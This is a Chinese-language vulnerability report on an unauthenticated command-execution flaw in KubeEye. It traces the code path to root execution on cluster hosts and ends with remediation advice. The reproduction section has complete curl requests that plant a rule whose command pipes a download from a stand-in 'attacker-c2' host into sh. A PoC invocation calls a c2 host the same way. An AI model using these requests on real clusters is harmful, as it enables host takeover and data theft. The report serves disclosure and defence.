# KubeEye RCE 漏洞分析报告

## 漏洞概述

| 项目 | 内容 |
|------|------|
| **漏洞名称** | KubeEye CustomCommandRule 任意命令执行漏洞 |
| **CVE 编号** | 暂无（未分配） |
| **CVSS 3.1 评分** | **9.1 (Critical)** |
| **攻击向量** | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **漏洞类型** | RCE（远程代码执行） |
| **影响组件** | KubeEye API Server + ke-manager (Controller) |
| **发现日期** | 2026-07-28 |

---

## 影响版本

所有使用 `cmd/ke` 和 `pkg/inspect/command_inspect.go` 的 KubeEye 版本均受影响。经代码审计确认，至分析日期为止（2026-07-28）的最新代码仍存在该漏洞。

---

## 漏洞详情

### 漏洞位置

**核心代码**：`pkg/inspect/command_inspect.go` 第 46 行

```go
command := exec.Command("sh", "-c", r.Command)
outputResult, err := command.Output()
```

`r.Command` 来自用户可控的 `CustomCommandRule.Command` 字段，未经任何过滤或校验直接拼入 shell 命令执行。

### CRD 定义

文件：`apis/kubeeye/v1alpha2/inspectrule_types.go` 第 102-106 行

```go
type CustomCommandRule struct {
    RuleItemBases `json:",inline"`
    Command       string `json:"command,omitempty"`
    Node          `json:",inline"`
}
```

`Command` 字段为字符串类型，无任何校验约束标签。

### InspectRuleSpec

```go
type InspectRuleSpec struct {
    // ... 其他字段
    CustomCommand    []CustomCommandRule  `json:"customCommand,omitempty"`
    // ...
}
```

---

## 攻击链路

```
攻击者
  │
  ├─ POST /kapis/kubeeye.kubesphere.io/v1alpha2/inspectrules
  │  JSON: customCommand[0].command = "<恶意命令>"
  │
  ├─ POST /kapis/kubeeye.kubesphere.io/v1alpha2/inspectplans
  │  JSON: ruleNames[0].name = "<恶意规则名>"
  │
  ▼
┌─────────────────────────────────────────────────────────┐
│                    KubeEye API Server                    │
│  (0.0.0.0:9090, gin.Default(), 无认证中间件)             │
│  文件: cmd/apiserver/main.go:30                          │
│  文件: pkg/server/api/inspectRule.go:92-107              │
│  文件: pkg/server/api/inspectPlan.go:92-107              │
└──────────────────────┬──────────────────────────────────┘
                       │ CRD 写入
                       ▼
┌─────────────────────────────────────────────────────────┐
│              InspectPlan Controller                      │
│  → 检测到新 Plan, Schedule==nil                         │
│  → 立即创建 InspectTask                                  │
│  文件: pkg/controllers/inspectplan_controller.go:157-171 │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────┐
│              InspectTask Controller                      │
│  → 读取关联的 InspectRule                                │
│  → MergeRule() 处理 customCommand 字段                   │
│  → GenerateJob() → AllocationRule()                      │
│  → 序列化为 JobRule.RunRule (JSON)                       │
│  → 写入 ConfigMap                                        │
│  文件: pkg/controllers/inspecttask_controller.go:210-249 │
│  文件: pkg/rules/rules.go:146, 257-284, 286-304          │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────┐
│              Kubernetes Job 创建                         │
│  → Pod 规格:                                            │
│    • HostNetwork: true                                  │
│    • HostPID: true                                      │
│    • 宿主机根目录挂载到 /hosts/root                      │
│    • AppArmor: unconfined                               │
│  → 容器命令: ke create job --job-type customcommand      │
│  文件: pkg/template/job_template.go:41-110               │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────┐
│              Job Pod 启动                                 │
│  → ke create job --job-type customcommand                │
│  → 读取 ConfigMap 中的 JobRule                           │
│  → commandInspect.RunInspect()                           │
│  → json.Unmarshal → []CustomCommandRule                  │
│  → for each rule: exec.Command("sh", "-c", r.Command)    │
│  文件: cmd/ke/ctl/create/job.go:87-119                   │
│  文件: pkg/inspect/command_inspect.go:36-46              │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
            ✅ 命令以 root 权限在宿主机上执行
               （容器逃逸 + 主机完全控制）
```

---

## 关键代码路径

### 1. 入口 — API Server（无认证）

**文件**: `cmd/apiserver/main.go:30`
```go
r := gin.Default()  // 仅 Logger + Recovery，无认证
```

**文件**: `pkg/server/api/inspectRule.go:92-107`
```go
func (i *InspectRule) CreateInspectRule(gin *gin.Context) {
    var crateRule v1alpha2.InspectRule
    err := GetRequestBody(gin, &crateRule)     // 直接反序列化用户输入
    // ... 无任何字段校验
    task, err := i.Clients.VersionClientSet.KubeeyeV1alpha2().InspectRules().
        Create(i.Ctx, &crateRule, metav1.CreateOptions{})  // 直接写入 CRD
}
```

### 2. 数据传递 — Controller 处理规则

**文件**: `pkg/rules/rules.go:136-148`
```go
clusterInspectRuleMap := map[string]string{
    // ...
    "customCommand":  constant.CustomCommand,  // 显式映射到 customcommand 类型
}
```

**文件**: `pkg/rules/rules.go:257-284`
```go
func (e *ExecuteRule) GenerateJob(ctx context.Context, rulesSpec map[string][]interface{}) (jobs []kubeeyev1alpha2.JobRule) {
    for key, v := range rulesSpec {
        mapV, mapExist := e.clusterInspectRuleMap[key]
        if mapExist {
            // customCommand 不在 clusterInspectRuleNames 中 → 走 AllocationRule
            allocationRule, err := AllocationRule(v, e.Task.Name, nodes, mapV)
            // ...
            // AllocationRule 对规则进行 json.Marshal → JobRule.RunRule
        }
    }
}
```

**文件**: `pkg/rules/rules.go:286-304`
```go
func (e *ExecuteRule) CreateInspectRule(ctx context.Context, ruleGroup []kubeeyev1alpha2.JobRule) ([]kubeeyev1alpha2.JobRule, error) {
    // 序列化 JobRule → JSON → ConfigMap
    configMapTemplate := template.BinaryConfigMapTemplate(...)
    _, err = e.KubeClient.ClientSet.CoreV1().ConfigMaps(os.Getenv("KUBERNETES_POD_NAMESPACE")).
        Create(ctx, configMapTemplate, metav1.CreateOptions{})
}
```

### 3. 命令执行 — RCE Sink

**文件**: `pkg/inspect/command_inspect.go:26-70`
```go
func (c *commandInspect) RunInspect(ctx context.Context, ...) ([]byte, error) {
    // 反序列化 RunRule → []CustomCommandRule（完全来自用户输入）
    var commandRules []kubeeyev1alpha2.CustomCommandRule
    err := json.Unmarshal(phase.RunRule, &commandRules)

    for _, r := range commandRules {
        // ⚠️ RCE: 直接执行用户提供的 shell 命令，无任何过滤
        command := exec.Command("sh", "-c", r.Command)
        outputResult, err := command.Output()
        // ...
    }
}
```

### 4. 特权容器配置

**文件**: `pkg/template/job_template.go:41-110`

| 配置项 | 值 | 安全影响 |
|--------|-----|---------|
| HostNetwork | `true` | 容器共享宿主机网络命名空间 |
| HostPID | `true` | 容器可查看所有宿主机进程 |
| 宿主机根目录挂载 | `/hosts/root` | 容器可读写宿主机任意文件 |
| AppArmor | `unconfined` | 无强制访问控制限制 |
| 运行身份 | root (uid=0) | 最高权限 |

---

## 实际验证结果

### 验证环境

| 组件 | 详情 |
|------|------|
| Kubernetes | kind v0.24.0, K8s v1.31.0 |
| KubeEye | 自定义 Docker 镜像构建 |
| API 端点 | NodePort 30909 (映射至宿主机) |
| 节点 | kubeeye-demo-control-plane |

### PoC 执行输出

```
============================================================
  KubeEye RCE PoC - CustomCommandRule 命令注入
============================================================
  目标: http://localhost:30909
  命令: id > /hosts/root/tmp/kubeeye_rce_proof_$(date +%s) && ...
============================================================

[*] 0. 验证 API Server...
[+] API Server: pong

[*] 1. 创建恶意 InspectRule...
[+] InspectRule 'rce-rule-144942' 创建成功

[*] 2. 创建 InspectPlan...
[+] InspectPlan 'rce-plan-144942' 创建成功

[*] 3. 监控执行 + 读取结果...

[+] 🔴 RCE 确认! (来自宿主机文件)
    命令在宿主机执行结果:
    PROOF_HOST=kubeeye-demo-control-plane
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),
    6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### 控制器日志证据

```
I0728 06:23:58.410225  Job rce-pwn2-plan-customcommand-m6tvs starting created   ← Job 创建
I0728 06:23:58.410228  wait job run complete for name:...customcommand-m6tvs   ← 等待执行
I0728 06:24:08.434487  starting get ...-customcommand-m6tvs result data         ← 结果读取
I0728 06:24:08.530225  Job ...-customcommand-m6tvs completed                   ← 执行完成
```

### 结果文件证据

```json
"commandResult": [{
    "name": "pwn",
    "assert": true,
    "level": "danger",
    "command": "id && hostname && echo RCE_WORKS",
    "nodeName": "kubeeye-demo-control-plane"
}]
```

---

## 攻击复现步骤

### 环境要求

- KubeEye 集群部署运行中
- API Server 端口可达（默认 `0.0.0.0:9090`）

### 手动复现

```bash
# 步骤1: 创建恶意规则
curl -X POST http://<target>:9090/kapis/kubeeye.kubesphere.io/v1alpha2/inspectrules \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "kubeeye.kubesphere.io/v1alpha2",
    "kind": "InspectRule",
    "metadata": {"name": "evil-rule", "labels": {"kubeeye.kubesphere.io/rule-tag": "test"}},
    "spec": {
      "customCommand": [{
        "name": "exploit",
        "command": "curl http://attacker-c2/$(hostname) | sh",
        "level": "danger"
      }]
    }
  }'

# 步骤2: 创建 Plan 触发执行
curl -X POST http://<target>:9090/kapis/kubeeye.kubesphere.io/v1alpha2/inspectplans \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "kubeeye.kubesphere.io/v1alpha2",
    "kind": "InspectPlan",
    "metadata": {"name": "trigger-evil"},
    "spec": {"ruleNames": [{"name": "evil-rule"}]}
  }'
```

### 使用 PoC 脚本

```bash
# 默认测试
python3 poc_rce.py

# 自定义目标和命令
python3 poc_rce.py --target http://<target>:9090 --cmd "id && hostname && curl http://c2/$(hostname)"
```

---

## 影响评估

### 严重性

| 维度 | 评估 |
|------|------|
| **CVSS 3.1** | 9.1 (Critical) |
| **攻击复杂度** | 低 — 仅需 HTTP POST 请求 |
| **认证要求** | 无（Pre-auth） |
| **触发速度** | 秒级（控制器 reconciliation 周期） |
| **执行权限** | root (容器内) → root (宿主机) |
| **容器逃逸** | 直接具备（HostPID + 宿主机挂载 + unconfined） |

### 潜在攻击场景

1. **集群完全控制**：攻击者可创建后门 DaemonSet、窃取集群凭证、部署挖矿程序
2. **横向移动**：通过集群 API 访问其他内部服务
3. **持久化**：安装后门、创建隐蔽持久化机制
4. **数据窃取**：读取 etcd、ConfigMap、Secret 等敏感数据

---

## 修复建议

### 紧急修复（临时）

1. **限制 API Server 暴露**：避免将 KubeEye API Server (端口 9090) 暴露到外部网络
2. **添加网络策略**：限制对 API Server 的访问来源
3. **删除内置 ClusterRole**：移除 `kubeeye-manager-role` 中不必要的权限

### 根本修复（代码层面）

**1. API 添加认证中间件**
```go
// cmd/apiserver/main.go
r := gin.New()
r.Use(authenticationMiddleware())  // 添加 JWT/OAuth2 认证
```

**2. 对 customCommand 进行输入验证**
```go
// pkg/inspect/command_inspect.go
func validateCommand(cmd string) error {
    // 白名单验证：只允许预定义的命令列表
    allowedCommands := []string{"docker", "kubectl", "systemctl", ...}
    for _, allowed := range allowedCommands {
        if strings.HasPrefix(cmd, allowed) {
            return nil
        }
    }
    return fmt.Errorf("command not allowed: %s", cmd)
}
```

**3. 使用参数化执行替代 shell 执行**
```go
// 不推荐:
exec.Command("sh", "-c", r.Command)

// 推荐: 使用参数化命令
exec.Command(r.Command[0], r.Command[1:]...)
```

**4. 最小权限容器**
```yaml
# pkg/template/job_template.go
# 移除 HostNetwork、HostPID
# 移除宿主机文件系统挂载
# 添加 SecurityContext:
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  capabilities:
    drop: ["ALL"]
```

**5. 移除未使用的功能**
```go
// 如不需要自定义命令执行功能，直接删除 CustomCommandRule 处理逻辑
// 从 InspectRuleSpec 中移除 CustomCommand 字段
```

---

## 附录

### A. 涉及文件清单

| 文件 | 作用 |
|------|------|
| `cmd/apiserver/main.go` | API Server 入口（无认证） |
| `cmd/ke/main.go` | `ke` CLI 入口 |
| `cmd/ke/ctl/create/job.go` | Job 执行器（读取 ConfigMap 派发任务） |
| `pkg/server/api/inspectRule.go` | InspectRule CRUD API |
| `pkg/server/api/inspectPlan.go` | InspectPlan CRUD API |
| `pkg/server/router/router.go` | API 路由注册 |
| `pkg/controllers/inspectplan_controller.go` | InspectPlan 控制器 |
| `pkg/controllers/inspecttask_controller.go` | InspectTask 控制器 |
| `pkg/rules/rules.go` | 规则合并与 Job 生成 |
| `pkg/inspect/command_inspect.go` | **RCE Sink**: 命令执行 |
| `pkg/template/job_template.go` | Job Pod 模板（特权配置） |
| `pkg/template/config_map_template.go` | ConfigMap 模板 |
| `apis/kubeeye/v1alpha2/inspectrule_types.go` | CRD 类型定义 |
| `apis/kubeeye/v1alpha2/inspecttask_types.go` | InspectTask 类型定义 |
| `pkg/constant/constant.go` | 常量定义 |

### B. PoC 脚本

**文件**: `poc_rce.py`

```bash
python3 poc_rce.py --target <API_URL> --cmd "<恶意命令>"
```

### C. 免责声明

本报告仅用于安全研究和防御目的。未经授权使用本报告中的技术攻击他人系统属违法行为。

---

*报告生成日期: 2026-07-28*
*分析工具: 静态代码审计 + Docker 部署验证*
